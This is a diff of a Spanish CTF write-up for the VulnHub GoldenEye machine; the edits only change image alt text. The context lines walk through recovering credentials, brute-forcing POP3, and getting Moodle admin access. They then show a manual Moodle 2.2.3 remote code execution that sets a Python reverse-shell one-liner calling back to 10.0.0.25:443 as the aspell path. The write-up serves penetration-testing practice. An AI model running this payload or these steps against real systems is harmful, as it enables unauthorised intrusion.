@@ -108,27 +108,27 @@ http://10.0.0.24/ [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubun
 
 Nos vemos nada interesante, asi que vamos a ver su contenido vía web.
 
-![](/assets/images/vh-goldeneye/goldeneye-web.png)
+![""](/assets/images/vh-goldeneye/goldeneye-web.png)
 
 Si checamos el código fuente al sitio web, vemos el script `terminal.js`.
 
-![](/assets/images/vh-goldeneye/goldeneye-web1.png)
+![""](/assets/images/vh-goldeneye/goldeneye-web1.png)
 
 Y si observamos el contenido de dicho archivo, tenemos usuarios potenciales y una contraseña url encodeada.
 
-![](/assets/images/vh-goldeneye/goldeneye-web2.png)
+![""](/assets/images/vh-goldeneye/goldeneye-web2.png)
 
 Tenemos el usuario **Boris** y **Natalya**; además dentro del texto nos indica que se tiene una contraseña cifrada que si buscamos los caracteres separados por punto y coma (;), Google nos transforma a la letra de corresponde, por lo que deberiamos buscar sería  ***ampersand hash encoding*** y vemos que la cadena está cifrada por entidades de HTML por lo que podríamos descifrar mediante algun recurso de internet de URL Encode/Decode.
 
-![](/assets/images/vh-goldeneye/goldeneye-web3.png)
+![""](/assets/images/vh-goldeneye/goldeneye-web3.png)
 
 Adicional, dentro del sitio web nos indica que debemos consulta un recurso bajo la ruta `/sev-home/`:
 
-![](/assets/images/vh-goldeneye/goldeneye-web4.png)
+![""](/assets/images/vh-goldeneye/goldeneye-web4.png)
 
 Entonces ya tenemos unas posibles credenciales y un panel de login, por lo que podríamos tratar de ingresar y como siempre, recordar guardar las credenciales y usuarios que tengamos. Tenemos que la combinación es `boris : InvincibleHack3r`.
 
-![](/assets/images/vh-goldeneye/goldeneye-web5.png)
+![""](/assets/images/vh-goldeneye/goldeneye-web5.png)
 
 Si vemos el código fuente hasta abajo, tenemos una leyenda que nos dice ***Qualified GoldenEye Network Operator Supervisors:  Natalya Boris***; por lo que ya debemos estar pensando que podrian ser usuarios a nivel de sistema. Nos vemos nada más interesante aquí, así que vamos a pasar por otros puertos que nos dio `nmap` y este caso sería el puerto 55007 asociado al servicio POP3. Si probamos las credenciales que tenemos, no obtenemos ningún resultado, así que vamos a tratar de emplear fuerza bruta para obtener las credenciales para ambos usuarios y para este caso vamos utilizar el diccionario `/usr/share/wordlists/fasttrack.txt` debido a que la contraseña no aparece en nuestro diccionario de confianza `rockyou.txt`:
 
@@ -309,15 +309,15 @@ Connection closed by foreign host.
 
 Vemos que no aplican, así que vamos vamos a agregar el dominio `severnaya-station.com` a nuestro archivo `/etc/hosts` ya que se está aplicando *virtual hosting* y vamos a checar el recurso que nos indican `severnaya-station.com/gnocertdir`, que ya debemos estar pensando que debe tener un panel de login.
 
-![](/assets/images/vh-goldeneye/goldeneye-web6.png)
+![""](/assets/images/vh-goldeneye/goldeneye-web6.png)
 
 Y tenemos un CMS (gestor de contenido) Moodle, así que vamos a tratar de loggearnos utilizando las credenciales que tenemos.
 
-![](/assets/images/vh-goldeneye/goldeneye-web7.png)
+![""](/assets/images/vh-goldeneye/goldeneye-web7.png)
 
 Navegando dentro del sitio, en ***My profile > Messages*** tenemos un mensaje del usuario **Dr Doak** :
 
-![](/assets/images/vh-goldeneye/goldeneye-web8.png)
+![""](/assets/images/vh-goldeneye/goldeneye-web8.png)
 
 Básicamente nos dice que el usuario de correo electrónico es **doak**; por lo que ya debemos estar pensando que tratar de utilizar fuerza bruta para obtener su contraseña.
 
@@ -379,11 +379,11 @@ password: 4England!
 
 Tenemos un probable usuario **james** y unas credenciales de acceso (posiblemente del CMS Moodle), por lo que vamos a tratar de ingresar al sitio con las nuevas credenciales  (**Nota**: Como siempre, debemos de guardar todas las credenciales que encontremos).
 
-![](/assets/images/vh-goldeneye/goldeneye-web9.png)
+![""](/assets/images/vh-goldeneye/goldeneye-web9.png)
 
 Bajo la ruta ***My profile > My private files*** vemos un recurso llamado **s3cret.txt**, así que le echamos un ojo:
 
-![](/assets/images/vh-goldeneye/goldeneye-web10.png)
+![""](/assets/images/vh-goldeneye/goldeneye-web10.png)
 
 ```bash
 ❯ cat s3cret.txt
@@ -403,7 +403,7 @@ Bajo la ruta ***My profile > My private files*** vemos un recurso llamado **s3cr
 
 Básicamente lo que nos dice es que chequemos el recurso `/dir007key/for-007.jpg`:
 
-![](/assets/images/vh-goldeneye/goldeneye-web11.png)
+![""](/assets/images/vh-goldeneye/goldeneye-web11.png)
 
 Nos vemos nada interesante en la imagen, así que vamos a descargarla y tratar de ver metadatos o si se está aplicando esteganografía.
 
@@ -453,25 +453,25 @@ xWinter1995x!
 
 Tenemos una contraseña y lo más seguro es que sea del usuario **admin** de acuerdo con el mensaje que vimos en `s3cret.txt`; así que vamos a tratar de loggearnos en el gestor de contenido.
 
-![](/assets/images/vh-goldeneye/goldeneye-web12.png)
+![""](/assets/images/vh-goldeneye/goldeneye-web12.png)
 
 Como nos encontramos como el usuario **admin**, podemos modificar algunas cosas del gestor del contenido, por lo que si buscamos un exploit público asociado a **Moodle 2.2.3** encontramos payloads del framework de metasploit; pero en este sitio cristiano no ocupamos ese tipo de cosas, por lo que vamos a analizar lo que hace el [exploit](https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/remote/29324.rb).
 
 - Primero nos dice que debemos ir a la ruta `/gnocertdir/admin/settings.php?section=editorsettingstinymce` y modificar el valor de **Spell engine** por **PSpellShell** y guardamos los cambios.
 
-![](/assets/images/vh-goldeneye/goldeneye-web13.png)
+![""](/assets/images/vh-goldeneye/goldeneye-web13.png)
 
 - Después debemos ir a `/gnocertdir/admin/settings.php?section=systempaths` y en el parámetro **Path to aspell** debemos poner nuestro comando que nos entable una reverse shell, para este caso utilizaremos python con la siguiente instrucción: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.25",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` y guardamos los cambios.
 
-![](/assets/images/vh-goldeneye/goldeneye-web14.png)
+![""](/assets/images/vh-goldeneye/goldeneye-web14.png)
 
 - Ahora necesitamos consulta el recurso `/gnocertdir/lib/editor/tinymce/tiny_mce/3.4.9/plugins/spellchecker/rpc.php` .
 
-![](/assets/images/vh-goldeneye/goldeneye-web15.png)
+![""](/assets/images/vh-goldeneye/goldeneye-web15.png)
 
 - Damos click secundario y elegimos la opción de **Inspeccionar**, en la nueva ventana que nos aparece seleccionamos **Red** y volvemos a cargar la página.
 
-![](/assets/images/vh-goldeneye/goldeneye-web16.png)
+![""](/assets/images/vh-goldeneye/goldeneye-web16.png)
 
 - Le damos click secundario a la petición que se realiza y seleccionamos la opción **Editar y reenviar**. El método lo debemos cambiar de **GET** a **POST** en el el **Cuerpo de la petición** agregamos `{"id":"c0","method":"checkWords","params":["en",[""]]}` y antes de envíar la petición, nos ponemos en escucha por el puerto 443 y la enviamos.
 
